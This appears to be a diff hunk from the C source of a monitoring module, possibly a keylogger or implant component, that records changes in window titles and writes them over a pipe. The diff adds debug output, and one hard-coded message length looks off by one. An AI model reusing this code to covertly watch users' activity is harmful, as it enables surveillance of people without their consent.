@@ -283,8 +283,10 @@ VOID ProcessWindowTitle()
         if (Instance->Win32.wcsncmp(Instance->g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
         {
 			SafePipeWrite("[+] Window title changed\n", 25);
+            
             memcpy(Instance->g_TitleBuffer, Buffer, sizeof(Buffer));
 
+			SafePipeWrite("[+] memcpy works\n", 16);
             Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, Instance->g_TitleBuffer);
 
 			SafePipeWrite("[+] New Window Title: ", 22);
